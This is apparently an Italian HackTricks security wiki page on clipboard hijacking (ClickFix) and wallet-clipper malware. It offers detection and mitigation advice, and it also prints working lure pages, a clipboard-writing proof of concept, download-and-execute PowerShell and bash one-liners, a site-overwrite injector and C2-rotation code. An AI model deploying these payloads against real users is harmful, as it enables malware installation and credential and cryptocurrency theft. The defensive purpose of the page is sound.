# Attacchi di clipboard hijacking (pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Non incollare mai nulla che non hai copiato tu." – un consiglio vecchio ma ancora valido

## Panoramica

Il clipboard hijacking – noto anche come *pastejacking* – sfrutta il fatto che gli utenti copiano e incollano regolarmente comandi senza controllarli. Una pagina web malevola (o qualsiasi contesto che supporti JavaScript, come un'applicazione Electron o desktop) inserisce programmaticamente testo controllato dall'attaccante negli appunti di sistema. Le vittime vengono invitate, normalmente tramite istruzioni di social engineering attentamente elaborate, a premere **Win + R** (finestra di dialogo Esegui), **Win + X** (Accesso rapido / PowerShell) oppure ad aprire un terminale e *incollare* il contenuto degli appunti, eseguendo immediatamente comandi arbitrari.

Poiché **non viene scaricato alcun file e non viene aperto alcun allegato**, la tecnica aggira la maggior parte dei controlli di sicurezza su e-mail e contenuti web che monitorano allegati, macro o l'esecuzione diretta di comandi. L'attacco è quindi molto usato nelle campagne di phishing che distribuiscono famiglie di malware comuni come NetSupport RAT, il loader Latrodectus o Lumma Stealer.<sup>[[1]](#references)</sup>

## Clipper per la sostituzione degli indirizzi dei wallet

Un'altra variante di **clipboard hijacking** non incolla affatto comandi: aspetta che la vittima copi un **indirizzo di wallet di criptovalute**, poi lo sostituisce silenziosamente con uno controllato dall'attaccante subito prima che venga incollato. È particolarmente efficace con i formati di wallet lunghi, perché spesso gli utenti controllano solo i primi e gli ultimi caratteri.<sup>[[8]](#references)</sup>

Caratteristiche comuni nel mondo reale:
- **Loader leggero + payload annidato**: l'app/exe visibile sembra uno strumento legittimo per il trading o per ottenere "profitti", mentre il clipper vero e proprio è nascosto più in profondità nel pacchetto (per esempio, un loader .NET che avvia un payload Rust annidato).
- **Sostituzione basata su regex**: il malware individua stringhe come `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` o anche stringhe generiche di **44 caratteri simili a quelle di Solana** e le riscrive inserendo wallet dell'attaccante.
- **Rotazione dei wallet su vasta scala**: i campioni moderni per Windows possono incorporare **migliaia** di wallet sostitutivi per valuta invece di un singolo indirizzo statico, riducendo il rischio che la reputazione del wallet venga compromessa dopo ogni furto.<sup>[[8]](#references)</sup>

### Flusso di un clipper su Windows

Un'implementazione comune consiste in una finestra nascosta registrata con **`AddClipboardFormatListener`**. A ogni aggiornamento degli appunti, il malware in genere chiama:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → accedere ai dati correnti degli appunti.
- **`GetClipboardData`** → leggere il testo.
- **`EmptyClipboard`** + **`SetClipboardData`** → sostituire la stringa del wallet con il valore dell'attaccante.

Regex minime usate spesso nei clipper:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

La persistenza a livello utente è sufficiente per avere un impatto. Un modello osservato è:<sup>[[8]](#references)</sup>
- Copiare il payload in **`%APPDATA%\silke\silke.exe`**
- Creare un **LNK nella cartella Startup** in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Idee per il rilevamento:
- Processi che chiamano continuamente le API degli appunti e scrivono anche in `%APPDATA%` e nella cartella **Startup** dell’utente.
- Creazione di un nuovo LNK/eseguibile seguita dalla riscrittura degli indirizzi dei wallet negli appunti.
- Archivi o bundle di software contraffatto contenenti molti file inutilizzati e un piccolo launcher che avvia un binario annidato.

### Rimozione della quarantena tramite social engineering su macOS + persistenza tramite LaunchAgent

Su macOS, alcune campagne distribuiscono un helper **`unlocker.command`** e indicano alla vittima di fare clic con il tasto destro → **Open** se Gatekeeper segnala che l’app è danneggiata o proviene da uno sviluppatore non identificato. Lo script rimuove semplicemente la quarantena e avvia il file `.app` vicino:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Questo **non** è un exploit di Gatekeeper; è un **bypass della quarantena tramite social engineering** che sfrutta il fatto che le decisioni di Gatekeeper dipendono dall’attributo esteso `com.apple.quarantine` (xattr).<sup>[[8]](#references)</sup>

Dopo l’esecuzione, il clipper può persistere come utente corrente scrivendo:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent con `RunAtLoad` e `KeepAlive`

Un dettaglio utile per la difesa è che alcuni campioni implementano un **watchdog autoriparante** che riscrive il LaunchAgent e il wrapper ogni ~30 secondi. Se rimuovi prima il plist **senza terminare il processo in esecuzione**, il malware potrebbe ricrearlo immediatamente.<sup>[[8]](#references)</sup> Ordine di pulizia sicuro:
1. Termina il processo clipper attivo.
2. Scarica/elimina il plist del LaunchAgent.
3. Elimina `~/launch.sh` e il payload copiato.

### Nota sulla distribuzione: falsa reputazione come moltiplicatore di efficacia

Per questa famiglia, il malware può essere tecnicamente semplice, mentre il **livello di distribuzione** fa il grosso del lavoro: stelle/fork falsi su GitHub, recensioni/download su SourceForge, commenti/visualizzazioni di tutorial su YouTube e commenti/voti apparentemente innocui su VirusTotal vengono usati per far apparire affidabile il binario prima dell’esecuzione.<sup>[[8]](#references)</sup>

## Pulsanti di copia forzata e payload nascosti (one-liner macOS)

Alcuni infostealer per macOS clonano siti di installazione (ad es. Homebrew) e **obbligano a usare un pulsante “Copy”**, impedendo agli utenti di selezionare solo il testo visibile. Il contenuto copiato negli appunti include il comando di installazione previsto più un payload Base64 aggiunto (ad es. `...; echo <b64> | base64 -d | sh`), così un singolo incolla esegue entrambi mentre l’interfaccia nasconde il passaggio aggiuntivo.<sup>[[5]](#references)</sup>

## Proof-of-Concept JavaScript

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Le campagne precedenti usavano `document.execCommand('copy')`, quelle più recenti si affidano alla **Clipboard API** asincrona (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Il flusso ClickFix / ClearFake

1. L'utente visita un sito typosquattato o compromesso (ad es. `docusign.sa[.]com`)
2. Il JavaScript **ClearFake** iniettato chiama una funzione helper `unsecuredCopyToClipboard()` che memorizza silenziosamente negli appunti una one-liner PowerShell codificata in Base64.
3. Le istruzioni HTML dicono alla vittima: *“Premi **Win + R**, incolla il comando e premi Invio per risolvere il problema.”*
4. `powershell.exe` viene eseguito e scarica un archivio che contiene un eseguibile legittimo e una DLL malevola (classico DLL sideloading).
5. Il loader decrittografa ulteriori fasi, inietta shellcode e installa la persistenza (ad es. un'attività pianificata), eseguendo infine NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Esempio di catena NetSupport RAT

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (Java WebStart legittimo) cerca `msvcp140.dll` nella propria directory.
* La DLL malevola risolve dinamicamente le API con **GetProcAddress**, scarica due file binari (`data_3.bin`, `data_4.bin`) tramite **curl.exe**, li decritta usando una chiave XOR a scorrimento `"https://google.com/"`, inietta lo shellcode finale ed estrae **client32.exe** (NetSupport RAT) in `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Scarica `la.txt` con **curl.exe**
2. Esegue il downloader JScript all’interno di **cscript.exe**
3. Recupera un payload MSI → deposita `libcef.dll` accanto a un’applicazione firmata → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer tramite MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

La chiamata **mshta** avvia uno script PowerShell nascosto che recupera `PartyContinued.exe`, estrae `Boat.pst` (CAB), ricostruisce `AutoIt3.exe` tramite `extrac32` e concatenazione di file e infine esegue uno script `.a3x` che esfiltra le credenziali del browser verso `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Appunti → PowerShell → JS eval → LNK di avvio con C2 a rotazione (PureHVNC)

Alcune campagne ClickFix saltano completamente il download di file e istruiscono le vittime a incollare una one-liner che recupera ed esegue JavaScript tramite WSH, lo rende persistente e cambia C2 ogni giorno. Esempio di catena osservata:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Caratteristiche principali
- URL offuscato invertito a runtime per impedirne l’ispezione superficiale.
- JavaScript si rende persistente tramite un LNK nella cartella Startup (WScript/CScript) e seleziona il C2 in base al giorno corrente, consentendo una rapida rotazione dei domini.<sup>[[3]](#references)</sup>

Frammento JS minimo usato per ruotare i C2 in base alla data:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

La fase successiva distribuisce comunemente un loader che stabilisce la persistenza e scarica un RAT (ad es., PureHVNC), spesso fissando TLS a un certificato hardcoded e suddividendo il traffico in chunk.<sup>[[3]](#references)</sup>

Idee di rilevamento specifiche per questa variante
- Albero dei processi: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (o `cscript.exe`).
- Artefatti di avvio: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` che avvia WScript/CScript con un percorso JS sotto `%TEMP%`/`%APPDATA%`.
- Telemetria del registro/RunMRU e della riga di comando contenente `.split('').reverse().join('')` o `eval(a.responseText)`.
- Esecuzioni ripetute di `powershell -NoProfile -NonInteractive -Command -` con payload stdin di grandi dimensioni per passare script lunghi senza righe di comando lunghe.
- Attività pianificate che in seguito eseguono LOLBins come `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` usando un'attività/percorso dall'aspetto di un updater (ad es., `\GoogleSystem\GoogleUpdater`).

Caccia alle minacce
- Hostname e URL C2 a rotazione giornaliera con il pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlare gli eventi di scrittura negli appunti, seguiti da incolla con Win+R e dall'esecuzione immediata di `powershell.exe`.

I team blue possono combinare la telemetria degli appunti, della creazione dei processi e del registro per individuare gli abusi di pastejacking:

* Registro di Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` conserva la cronologia dei comandi **Win + R**: cercare voci insolite codificate in Base64 o offuscate.
* Evento di sicurezza ID **4688** (creazione del processo) in cui `ParentImage` == `explorer.exe` e `NewProcessName` appartiene a { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Evento ID **4663** per la creazione di file sotto `%LocalAppData%\Microsoft\Windows\WinX\` o in cartelle temporanee subito prima dell'evento 4688 sospetto.
* Sensori EDR per gli appunti (se disponibili): correlare una `Clipboard Write` seguita immediatamente da un nuovo processo PowerShell.

## Pagine di verifica in stile IUAM (ClickFix Generator): copia dagli appunti alla console + payload consapevoli del sistema operativo

Le campagne recenti producono in massa false pagine di verifica CDN/browser ("Just a moment…", in stile IUAM) che inducono gli utenti a copiare comandi specifici per il sistema operativo dagli appunti nelle console native. In questo modo l'esecuzione esce dalla sandbox del browser e funziona sia su Windows sia su macOS.<sup>[[4]](#references)</sup>

Caratteristiche principali delle pagine generate dal builder
- Rilevamento del sistema operativo tramite `navigator.userAgent` per adattare i payload (Windows PowerShell/CMD o Terminal su macOS). Sono disponibili anche esche/no-op per i sistemi operativi non supportati, così da mantenere l'illusione.
- Copia automatica negli appunti in risposta ad azioni innocue nell'interfaccia (checkbox/Copia), mentre il testo visibile può differire dal contenuto degli appunti.
- Blocco dei dispositivi mobili e popup con istruzioni dettagliate: Windows → Win+R→incolla→Invio; macOS → apri Terminal→incolla→Invio.
- Offuscamento facoltativo e injector a file singolo per sovrascrivere il DOM di un sito compromesso con un'interfaccia di verifica stilizzata con Tailwind (senza dover registrare un nuovo dominio).<sup>[[4]](#references)</sup>

Esempio: discrepanza tra appunti e testo visibile + branching consapevole del sistema operativo
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

Persistenza su macOS della prima esecuzione
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` così l'esecuzione continua dopo la chiusura del terminale, riducendo le tracce visibili.<sup>[[4]](#references)</sup>

Hijacking della pagina direttamente sui siti compromessi
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Idee di rilevamento e threat hunting specifiche per le esche in stile IUAM
- Web: pagine che associano la Clipboard API a widget di verifica; discrepanza tra il testo visualizzato e il contenuto degli appunti; ramificazioni basate su `navigator.userAgent`; Tailwind + sostituzione di una singola pagina in contesti sospetti.
- Endpoint Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` poco dopo un’interazione con il browser; installer batch/MSI eseguiti da `%TEMP%`.
- Endpoint macOS: Terminal/iTerm che avviano `bash`/`curl`/`base64 -d` con `nohup` in prossimità di eventi del browser; processi in background che continuano a funzionare dopo la chiusura del terminale.
- Correlare la cronologia di `RunMRU` Win+R e le scritture negli appunti con la successiva creazione di processi console.

Vedi anche le tecniche correlate

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Evoluzioni dei falsi CAPTCHA / ClickFix del 2026 (ClearFake, Scarlet Goldfinch)

- ClearFake continua a compromettere siti WordPress e a iniettare JavaScript loader che concatenano host esterni (Cloudflare Workers, GitHub/jsDelivr) e persino chiamate blockchain di tipo “etherhiding” (ad es., richieste POST a endpoint API di Binance Smart Chain come `bsc-testnet.drpc[.]org`) per recuperare la logica aggiornata delle esche. Gli overlay recenti fanno ampio uso di falsi CAPTCHA che invitano gli utenti a copiare e incollare una singola riga di comando (T1204.004), invece di scaricare qualcosa.<sup>[[6]](#references)</sup>
- L’esecuzione iniziale viene sempre più spesso delegata a host di script firmati/LOLBAS. Le catene di attacco di gennaio 2026 hanno sostituito l’uso precedente di `mshta` con `SyncAppvPublishingServer.vbs`, integrato nel sistema ed eseguito tramite `WScript.exe`, passando argomenti simili a PowerShell con alias e wildcard per recuperare contenuti remoti:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` è firmato e normalmente usato da App-V; abbinato a `WScript.exe` e ad argomenti insoliti (alias `gal`/`gcm`, cmdlet con caratteri jolly, URL jsDelivr) diventa una fase LOLBAS altamente indicativa per ClearFake.<sup>[[6]](#references)</sup>
- Nel febbraio 2026, i payload CAPTCHA falsi sono tornati a usare esclusivamente download cradle di PowerShell. Due esempi attivi:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - La prima catena è un grabber in-memory `iex(irm ...)`; la seconda esegue lo staging tramite `WinHttp.WinHttpRequest.5.1`, scrive un file `.ps1` temporaneo e poi lo avvia con `-ep bypass` in una finestra nascosta.<sup>[[6]](#references)</sup>

Suggerimenti per il rilevamento e la ricerca di queste varianti
- Albero dei processi: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` o PowerShell cradle subito dopo le scritture negli appunti/Win+R.
- Parole chiave nella riga di comando: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domini jsDelivr/GitHub/Cloudflare Worker o pattern `iex(irm ...)` con IP grezzi.
- Rete: connessioni in uscita verso host CDN Worker o endpoint RPC blockchain da script host/PowerShell, subito dopo la navigazione web.
- File/registro: creazione di `.ps1` temporanei in `%TEMP%` e voci RunMRU contenenti queste one-liner; bloccare/segnalare i LOLBAS con script firmati (WScript/cscript/mshta) eseguiti con URL esterni o stringhe alias offuscate.

## Tecniche ClickFix di giugno 2026: telemetria degli incolla, commenti di verifica falsi e concatenamento di LOLBin

La recente telemetria di Red Canary mostra che l’indicatore stabile **non è un comando specifico**, ma la combinazione di **incolla ed esecuzione assistiti dall’utente**, **interpreti/LOLBins attendibili**, **flag offuscati**, **recupero remoto** ed **esecuzione immediata**.<sup>[[7]](#references)</sup>

### Pattern operativi degni di nota

- **Telemetria di conferma dell’incolla**: alcuni payload inviano `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` prima della fase reale. Ciò conferma l’interazione dell’utente mantenendo la finestra breve e discreta.
- **Commenti di verifica falsi**: le one-liner di PowerShell possono aggiungere stringhe come `# Security check ✔️ I'm not a robot Verification ID: 138105`, in modo che il comando sembri ancora relativo a un CAPTCHA dopo essere stato incollato in Run / `cmd.exe` / nella cronologia di PowerShell.
- **Ricostruzione dinamica degli URL**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` evita di inserire un URL statico nella riga di comando, pur eseguendo il download in-memory e l’esecuzione.
- **Esecuzione di installer camuffati**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abusa di maiuscole insolite e caratteri simili a Unicode nei flag per eludere i rilevamenti fragili, continuando a sembrare `msiexec.exe`.
- **Catene di LOLBin con escape tramite accento circonflesso**: `cmd.exe` può nascondere parole chiave con escape `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), avviare la shell annidata in modalità minimizzata, salvare il contenuto dell’attaccante con un’estensione innocua come `.pdf` e poi eseguirlo tramite `mshta`.<sup>[[7]](#references)</sup>
## Mitigazioni

1. Rafforzamento del browser – disabilitare l’accesso in scrittura agli appunti (`dom.events.asyncClipboard.clipboardItem` ecc.) o richiedere un gesto dell’utente.
2. Formazione sulla sicurezza – insegnare agli utenti a *digitare* i comandi sensibili o a incollarli prima in un editor di testo.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control per bloccare le one-liner arbitrarie.
4. Controlli di rete – bloccare le richieste in uscita verso domini noti di pastejacking e malware C2.

## Tecniche correlate

* **Discord Invite Hijacking** spesso abusa dello stesso approccio ClickFix dopo aver attirato gli utenti in un server malevolo:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Correggere il clic: prevenire il vettore di attacco ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [PoC di Pastejacking – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Sotto la cortina pura: da RAT a builder a coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [La fabbrica ClickFix: prima esposizione del generatore IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, l’anno dell’Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Approfondimenti di intelligence: febbraio 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Approfondimenti di intelligence: giugno 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Dalle stelle agli upvote: la falsa reputazione alimenta un crypto clipboard hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
